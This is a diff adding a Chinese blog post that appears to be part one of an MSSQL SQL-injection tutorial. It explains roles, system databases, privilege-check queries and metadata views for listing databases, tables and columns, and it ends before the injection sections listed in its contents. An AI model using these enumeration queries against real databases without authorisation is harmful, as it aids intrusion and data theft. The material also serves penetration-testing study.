@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="MSSQL注入·一"><meta name="keywords" content="SQL注入"><meta name="author" content="mlccs,undefined"><meta name="copyright" content="mlccs"><title>MSSQL注入·一【!&gt;-_-&lt;!】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"S6Y49E5I4K","apiKey":"8c221da4a00bc9951e60cd14527148e3","indexName":"git_BLOG","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: ,
+  valine: ,
+}</script><meta name="generator" content="Hexo 5.4.0"></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E5%90%8D-%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.</span> <span class="toc-text">登陆名&#x2F;用户名</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8D"><span class="toc-number">1.1.</span> <span class="toc-text">登录名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.2.</span> <span class="toc-text">用户名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A0%E5%B0%84"><span class="toc-number">1.3.</span> <span class="toc-text">映射</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BA%E6%9C%89%E8%A7%92%E8%89%B2"><span class="toc-number">2.</span> <span class="toc-text">固有角色</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E5%AE%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2"><span class="toc-number">2.1.</span> <span class="toc-text">固定服务器角色</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%92%E8%89%B2"><span class="toc-number">2.2.</span> <span class="toc-text">固定数据库角色</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DBO"><span class="toc-number">3.</span> <span class="toc-text">DBO</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">4.</span> <span class="toc-text">系统库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL%E7%89%B9%E6%80%A7"><span class="toc-number">5.</span> <span class="toc-text">MSSQL特性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">5.1.</span> <span class="toc-text">全局变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">5.2.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E5%90%8D%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">5.3.</span> <span class="toc-text">列名单双引号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%9D%83%E9%99%90"><span class="toc-number">6.</span> <span class="toc-text">查询权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E6%98%AFDBMS%E7%AE%A1%E7%90%86%E5%91%98-sa"><span class="toc-number">6.1.</span> <span class="toc-text">是否是DBMS管理员(sa)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E6%98%AF%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%9E%E4%B8%BB"><span class="toc-number">6.2.</span> <span class="toc-text">是否是数据库属主</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%BA%93-%E8%A1%A8-%E8%A7%86%E5%9B%BE"><span class="toc-number">7.</span> <span class="toc-text">关键库&#x2F;表&#x2F;视图</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-databases"><span class="toc-number">7.1.</span> <span class="toc-text">.sys.databases</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sysobjects"><span class="toc-number">7.2.</span> <span class="toc-text">..sysobjects</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-objects"><span class="toc-number">7.3.</span> <span class="toc-text">.sys.objects</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-tables"><span class="toc-number">7.4.</span> <span class="toc-text">.sys.tables</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-columns"><span class="toc-number">7.5.</span> <span class="toc-text">.sys.columns</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscolumns"><span class="toc-number">7.6.</span> <span class="toc-text">..syscolumns</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#information-schema-tables"><span class="toc-number">7.7.</span> <span class="toc-text">.information_schema.tables</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#information-schema-columns"><span class="toc-number">7.8.</span> <span class="toc-text">.information_schema.columns</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0limit"><span class="toc-number">8.</span> <span class="toc-text">实现limit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0group-concat"><span class="toc-number">9.</span> <span class="toc-text">实现group_concat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TIPS"><span class="toc-number">10.</span> <span class="toc-text">TIPS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">11.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">12.</span> <span class="toc-text">基本注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BA%93%E6%95%B0%E9%87%8F"><span class="toc-number">12.1.</span> <span class="toc-text">获取库数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D"><span class="toc-number">12.2.</span> <span class="toc-text">获取库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E6%95%B0%E9%87%8F"><span class="toc-number">12.3.</span> <span class="toc-text">获取表数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">12.4.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E6%95%B0%E9%87%8F"><span class="toc-number">12.5.</span> <span class="toc-text">获取列数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-number">12.6.</span> <span class="toc-text">获取列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">12.7.</span> <span class="toc-text">获取数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99"><span class="toc-number">13.1.</span> <span class="toc-text">函数报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E6%8A%A5%E9%94%99"><span class="toc-number">13.2.</span> <span class="toc-text">运算符报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">14.</span> <span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Order-By%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">Order By后的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%85%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98"><span class="toc-number">15.1.</span> <span class="toc-text">待解决问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="toc-number">16.</span> <span class="toc-text">参考文档</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">mlccs</div><div class="author-info-description"></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">2</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">2</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">1</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">!&gt;-_-&lt;!</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">MSSQL注入·一</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2021-08-04 | 更新于 2021-08-04</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/WEB/">WEB</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div></div></div><div class="main-content"><p>测试环境：MSSQL 2012 sp1</p>
+<h1 id="登陆名-用户名"><a href="#登陆名-用户名" class="headerlink" title="登陆名/用户名"></a>登陆名/用户名</h1><h2 id="登录名"><a href="#登录名" class="headerlink" title="登录名"></a>登录名</h2><p>​        服务器上的一个实体，使用一个登录名只能进入服务器，不能访问服务器中的数据库资源。服务器上登录名的定义存放在master数据库的syslogins表中。</p>
+<h2 id="用户名"><a href="#用户名" class="headerlink" title="用户名"></a>用户名</h2><p>​        一个或多个登录对象在数据库中的映射，可以对用户对象进行授权，以便为登录对象提供对数据库的访问权限。用户定义信息存放在每个数据库的sysusers表中。</p>
+<h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><p>​        MSSQL把登录名与用户名的关系称为映射。用登录名登录MSSQL后，在访问各个数据库时，MSSQL会自动查询此数据库中是否存在与此登录名关联的用户名，若存在就使用此用户的权限访问此数据库，若不存在就是用guest用户访问此数据库。</p>
+<p>​        一个登录名可以被授权访问多个数据库，但一个登录名在每个数据库中只能映射一次。一个登录可对应多个用户，一个用户也可以被多个登录使用。</p>
+<p>​        我们常见的dbo是指以sa或windows  administration(Windows集成验证登录方式)等登录名在数据库中映射到的用户名。</p>
+<p>​        SQL Server中还有一个特殊的数据库角色public，它存在于每一个数据库中，包括系统数据库，如master、msdb、model和用户数据库，数据库的所有用户都属于public角色，并且不能从public角色中删除。</p>
+<h1 id="固有角色"><a href="#固有角色" class="headerlink" title="固有角色"></a>固有角色</h1><p>​        角色是一组权限的集合</p>
+<h2 id="固定服务器角色"><a href="#固定服务器角色" class="headerlink" title="固定服务器角色"></a>固定服务器角色</h2><table>
+<thead>
+<tr>
+<th>sysadmin</th>
+<th>可以在 SQL Server 中执行任何活动</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>serveradmin</td>
+<td>可以设置服务器范围的配置选项，关闭服务器</td>
+</tr>
+<tr>
+<td>setupadmin</td>
+<td>可以管理链接服务器和启动过程</td>
+</tr>
+<tr>
+<td>securityadmin</td>
+<td>可以管理登录和 CREATE DATABASE 权限，还可以读取错误日志和更改密码</td>
+</tr>
+<tr>
+<td>processadmin</td>
+<td>可以管理在 SQL Server 中运行的进程</td>
+</tr>
+<tr>
+<td>dbcreator</td>
+<td>可以创建、更改和删除数据库</td>
+</tr>
+<tr>
+<td>diskadmin</td>
+<td>可以管理磁盘文件</td>
+</tr>
+<tr>
+<td>bulkadmin</td>
+<td>可以执行 BULK INSERT 语句</td>
+</tr>
+</tbody></table>
+<h2 id="固定数据库角色"><a href="#固定数据库角色" class="headerlink" title="固定数据库角色"></a>固定数据库角色</h2><table>
+<thead>
+<tr>
+<th>db_owner</th>
+<th>在数据库中有全部权限</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>db_accessadmin</td>
+<td>可以添加或删除用户 ID</td>
+</tr>
+<tr>
+<td>db_securityadmin</td>
+<td>可以管理全部权限、对象所有权、角色和角色成员资格</td>
+</tr>
+<tr>
+<td>db_ddladmin</td>
+<td>可以发出 ALL DDL，但不能发出 GRANT、REVOKE 或 DENY 语句</td>
+</tr>
+<tr>
+<td>db_backupoperator</td>
+<td>可以发出 DBCC、CHECKPOINT 和 BACKUP 语句</td>
+</tr>
+<tr>
+<td>db_datareader</td>
+<td>可以选择数据库内任何用户表中的所有数据</td>
+</tr>
+<tr>
+<td>db_datawriter</td>
+<td>可以更改数据库内任何用户表中的所有数据</td>
+</tr>
+<tr>
+<td>db_denydatareader</td>
+<td>不能选择数据库内任何用户表中的任何数据</td>
+</tr>
+<tr>
+<td>db_denydatawriter</td>
+<td>不能更改数据库内任何用户表中的任何数据</td>
+</tr>
+</tbody></table>
+<h1 id="DBO"><a href="#DBO" class="headerlink" title="DBO"></a>DBO</h1><p>MSSQL中可以看到很多表名都有前缀dbo，但是查询的时候不写也可以<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730135817372.png" alt="image-20210730135817372"></p>
+<p>或者使用<database_name>.<user_name>.<table_name>的形式访问，中间的<user_name>可以省略<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730140052039.png" alt="image-20210730140052039"></p>
+<p>对于dbo，有2种含义</p>
+<p>1、dbo是一个架构(schema)，在sql2005中,表的调用格式如下:”<database_name>.<schema_name>.<table_name>“,同一个用户可以被授权访问多个架构,也可以被禁止访问某个或多个架构,这就是2005中提倡的”用户与架构分离”的概念. 在2005中,如果在创建表时没有指定架构(schema),那么系统默认该表的架构是dbo,所以会出现很多表名前自动加上dbo.字符样式。</p>
+<p>2、DBO是每个数据库的默认用户，具有所有者权限，即DbOwner </p>
+<p>​        dbo是默认用户也是架构，dbo作为架构是为了更好的与2000兼容，在2005前，没有架构的概念，只有用户的概念，那时候DBO是默认用户,大部分的数据库对象都是dbo的，到了2005，有了架构概念，但是为了向后兼容，保留了DBO，并且把DBO作为默认架构，在不指定架构的情况下，默认为dbo</p>
+<p>在2000中DataBaseName.dbo.TableName解释为：数据库名.用户名.表名<br>在2005中DataBaseName.dbo.TableName解释为：数据库名.架构名.表名</p>
+<p>​        在数据库中，可以有多个用户，每个用户可以有多个模式（在smss中叫做架构，模式的意义就是定义命名空间，防止出现命名冲突），每个模式可以有多张表。</p>
+<h1 id="系统库"><a href="#系统库" class="headerlink" title="系统库"></a>系统库</h1><p>MSSQL有6个默认库，分别是4个系统数据库：master 、model 、msdb 、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p>
+<p>master：master数据库控制SQL Server的所有信息。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。</p>
+<p>model：model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。</p>
+<p>msdb：msdb数据库是一个用户数据库，所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史，SQL Server Agent将会使用这个库。</p>
+<p>tempdb：tempdb数据库供所有来访问SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803103231817.png" alt="image-20210803103231817"></p>
+<h1 id="MSSQL特性"><a href="#MSSQL特性" class="headerlink" title="MSSQL特性"></a>MSSQL特性</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><table>
+<thead>
+<tr>
+<th>@@version</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DB_NAME()</td>
+<td>当前数据库，可使用DB_NAME(<id>)遍历库名</td>
+</tr>
+<tr>
+<td>CURRENT_USER</td>
+<td>表示当前数据库用户名，比如：dbo</td>
+</tr>
+<tr>
+<td>SYSTEM_USER</td>
+<td>表示当前登录名，比如：MYCOMPUTER\Administrator、sa</td>
+</tr>
+<tr>
+<td>USER</td>
+<td>表示当前数据库属主，比如：dbo</td>
+</tr>
+</tbody></table>
+<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&lt;空格&gt;</span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>
+
+<h2 id="列名单双引号"><a href="#列名单双引号" class="headerlink" title="列名单双引号"></a>列名单双引号</h2><p>查询时单引号中的会被解释为字符串，双引号中的则会被解释为列名，使用select “test”会抛出列名无效的错误。<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803101449356.png" alt="image-20210803101449356"><br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803101508031.png" alt="image-20210803101508031"></p>
+<h1 id="查询权限"><a href="#查询权限" class="headerlink" title="查询权限"></a>查询权限</h1><h2 id="是否是DBMS管理员-sa"><a href="#是否是DBMS管理员-sa" class="headerlink" title="是否是DBMS管理员(sa)"></a>是否是DBMS管理员(sa)</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line"><span class="comment">-- IS_SRVROLEMEMBER ( &#x27;role&#x27; [ , &#x27;login&#x27; ] )  </span></span><br><span class="line"><span class="comment">-- &#x27; role &#x27;  ：要检查的服务器角色的名称。 role 为 sysname 。role 的有效值是用户定义的服务器角色和固定服务器角色</span></span><br><span class="line"><span class="comment">-- &#x27; login &#x27; ：要检查的 SQL Server 登录的名称。 login 的数据类型为 sysname，默认值为 NULL。 如果未指定值，则结果视当前执行上下文而定。 如果此参数包含词 NULL，将返回 NULL。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="是否是数据库属主"><a href="#是否是数据库属主" class="headerlink" title="是否是数据库属主"></a>是否是数据库属主</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> is_member(<span class="string">&#x27;db_owner&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">current_user</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;dbo&#x27;</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; </span><br></pre></td></tr></table></figure>
+
+<h1 id="关键库-表-视图"><a href="#关键库-表-视图" class="headerlink" title="关键库/表/视图"></a>关键库/表/视图</h1><h2 id="sys-databases"><a href="#sys-databases" class="headerlink" title=".sys.databases"></a><database_name>.sys.databases</h2><p>每个数据库都有的视图，其中包含了DBMS中所有数据库的描述信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test01.sys.databases				<span class="comment">-- 用户自己创建的库id从7开始</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210804004202175.png" alt="image-20210804004202175"></p>
+<h2 id="sysobjects"><a href="#sysobjects" class="headerlink" title="..sysobjects"></a><database_name>..sysobjects</h2><p>每个数据库都有的视图，在指定数据库中创建的每个对象(例如约束、默认值、日志、规则以及存储过程)都对应一行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;			<span class="comment">-- 查询test01库中用户创建的表</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803110749243.png" alt="image-20210803110749243"></p>
+<h2 id="sys-objects"><a href="#sys-objects" class="headerlink" title=".sys.objects"></a><database_name>.sys.objects</h2><p>每个数据库都有的视图，在指定数据库中创建的每个对象(例如约束、默认值、日志、规则以及存储过程)都对应一行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01.sys.objects <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;		<span class="comment">-- 查询用户创建的表</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803111126581.png" alt="image-20210803111126581"></p>
+<h2 id="sys-tables"><a href="#sys-tables" class="headerlink" title=".sys.tables"></a><database_name>.sys.tables</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01.sys.tables;			<span class="comment">-- 查询指定数据库中的用户表</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803112733474.png" alt="image-20210803112733474"></p>
+<h2 id="sys-columns"><a href="#sys-columns" class="headerlink" title=".sys.columns"></a><database_name>.sys.columns</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> testuser01.sys.columns <span class="keyword">where</span> object_id<span class="operator">=</span>OBJECT_ID(<span class="string">&#x27;test01..users&#x27;</span>);		<span class="comment">-- 获取指定表的列名</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803132432805.png" alt="image-20210803132432805"></p>
+<h2 id="syscolumns"><a href="#syscolumns" class="headerlink" title="..syscolumns"></a><database_name>..syscolumns</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01..syscolumns <span class="keyword">where</span> id<span class="operator">=</span>OBJECT_ID(<span class="string">&#x27;test01..users&#x27;</span>);		<span class="comment">-- 获取指定表的列名</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803133600422.png" alt="image-20210803133600422"></p>
+<h2 id="information-schema-tables"><a href="#information-schema-tables" class="headerlink" title=".information_schema.tables"></a><database_name>.information_schema.tables</h2><p>MSSQL中也有一个information_schema，但这个information_schema并不是一个数据库，而是一个架构。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01.INFORMATION_SCHEMA.TABLES;</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210804003345986.png" alt="image-20210804003345986"></p>
+<h2 id="information-schema-columns"><a href="#information-schema-columns" class="headerlink" title=".information_schema.columns"></a><database_name>.information_schema.columns</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01.INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210804003606915.png" alt="image-20210804003606915"></p>
+<h1 id="实现limit"><a href="#实现limit" class="headerlink" title="实现limit"></a>实现limit</h1><p>MSSQL中不支持limit关键字,可使用TOP和not in组合实现limit功能</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> test01..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> test01..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="实现group-concat"><a href="#实现group-concat" class="headerlink" title="实现group_concat"></a>实现group_concat</h1><p>MSSQL中没有类似于mysql的group_concat这样的函数，可以使用stuff()函数配合for xml(‘’)达到类似效果</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STUFF ( character_expression , <span class="keyword">start</span> , length , replaceWith_expression )  </span><br><span class="line"><span class="comment">-- STUFF 函数将字符串插入到另一个字符串中。 它使用第二个字符串替换第一个字符串的start位置开始length长度的字符串。字符串位置计数从1开始</span></span><br></pre></td></tr></table></figure>
+
+<p>测试表如下<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210804101252920.png" alt="image-20210804101252920"></p>
+<p>group_concat实现语句如下</p>
